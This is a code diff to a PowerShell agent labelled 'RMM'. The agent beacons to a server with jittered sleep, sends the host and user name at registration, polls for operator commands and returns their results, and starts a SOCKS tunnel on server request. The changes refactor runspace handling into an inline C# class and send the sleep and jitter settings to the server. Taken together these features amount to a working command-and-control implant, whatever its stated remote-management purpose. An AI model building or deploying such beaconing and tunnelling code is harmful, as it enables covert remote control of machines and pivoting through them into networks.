@@ -47,6 +47,8 @@ $httpProxyUseDefaultCredentials = $false
 
 $verboseHttp = $false
 
+$script:RmmRegisterConfigSynced = $false
+
 # -----------------------------------------------------------------------------
 # Optional environment overrides (when set, they replace the variables above)
 # -----------------------------------------------------------------------------
@@ -85,7 +87,19 @@ $script:RmmEverRegistered = $false
 $script:RmmVerbose = [bool]$verboseHttp
 $script:UsePersistentHttp = [bool]$persistentHttp
 $script:RmmShellCwd = (Get-Location).Path
-$script:RmmBeaconRunspace = $host.Runspace
+if (-not ('RmmHostAnchor' -as [type])) {
+    Add-Type -TypeDefinition @'
+using System.Management.Automation.Runspaces;
+public static class RmmHostAnchor {
+    public static Runspace Beacon;
+    public static void Restore() {
+        if (Beacon != null && Runspace.DefaultRunspace != Beacon)
+            Runspace.DefaultRunspace = Beacon;
+    }
+}
+'@
+}
+[RmmHostAnchor]::Beacon = $host.Runspace
 $script:RmmSocksWorker = @{
     Running    = $false
     Runspace   = $null
@@ -592,7 +606,7 @@ function Get-RmmCmdSocksActive {
 }
 
 function Drain-RmmSocksHostLog {
-    Restore-RmmHostRunspace
+    [RmmHostAnchor]::Restore()
     if ($null -eq $script:RmmSocksLogQueue) { return }
     $line = $null
     while ($script:RmmSocksLogQueue.TryDequeue([ref]$line)) {
@@ -615,7 +629,7 @@ function Sync-RmmSocksChannelFromServer {
         Stop-RmmSocksChannelWorker
     }
     Drain-RmmSocksHostLog
-    Restore-RmmHostRunspace
+    [RmmHostAnchor]::Restore()
 }
 
 function Get-RmmSocksPollActive {
@@ -973,7 +987,7 @@ function Start-RmmSocksChannelWorker {
         $socksRs.Close()
         return
     }
-    Restore-RmmHostRunspace
+    [RmmHostAnchor]::Restore()
 
     $script:RmmSocksWorker.Running = $true
     $script:RmmSocksWorker.Runspace = $socksRs
@@ -981,7 +995,7 @@ function Start-RmmSocksChannelWorker {
     $script:RmmSocksWorker.Async = $async
     Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
     Drain-RmmSocksHostLog
-    Restore-RmmHostRunspace
+    [RmmHostAnchor]::Restore()
 }
 
 function Stop-RmmSocksChannelWorker {
@@ -1002,7 +1016,7 @@ function Stop-RmmSocksChannelWorker {
     $script:RmmSocksWorker.Async = $null
     Drain-RmmSocksHostLog
     Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
-    Restore-RmmHostRunspace
+    [RmmHostAnchor]::Restore()
 }
 
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
@@ -1163,14 +1177,6 @@ function Get-RmmWebExceptionResponse {
     return $null
 }
 
-function Restore-RmmHostRunspace {
-    $beacon = $script:RmmBeaconRunspace
-    if ($null -eq $beacon) { return }
-    if ([runspace]::DefaultRunspace -ne $beacon) {
-        [runspace]::DefaultRunspace = $beacon
-    }
-}
-
 function Test-RmmSessionTerminated {
     param($ErrorRecord)
     try {
@@ -1194,12 +1200,17 @@ function Register-RmmSession {
         [switch]$Quiet,
         [switch]$Reconnect
     )
-    $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
+    $registerQs = "id=$sessionId&h=$computerName&u=$userName"
+    if (-not $script:RmmRegisterConfigSynced) {
+        $registerQs += "&s=$($script:baseSleepSeconds)&j=$($script:jitterPercent)&sync=1"
+    }
+    $registerUrl = "$u/register?$registerQs"
     $headers = Get-RmmRequestHeaders
     Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
     try {
         $null = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
         $script:RmmEverRegistered = $true
+        $script:RmmRegisterConfigSynced = $true
         if (-not $Quiet) {
             if ($Reconnect) {
                 Write-Host "[+] Reconnected to RMM server (ID: $sessionId)" -ForegroundColor Green
@@ -1266,8 +1277,8 @@ while (-not $registered) {
 # Main loop — beacon (/register, /cmd, /result); SOCKS channel starts when server socks_active is true
 while ($true) {
     try {
-        Restore-RmmHostRunspace
-        $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
+        [RmmHostAnchor]::Restore()
+        $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent
 
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
@@ -1516,7 +1527,7 @@ while ($true) {
         Drain-RmmSocksHostLog
         
     } catch {
-        Restore-RmmHostRunspace
+        [RmmHostAnchor]::Restore()
         if (Test-RmmSessionTerminated -ErrorRecord $_) {
             Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
             exit 0
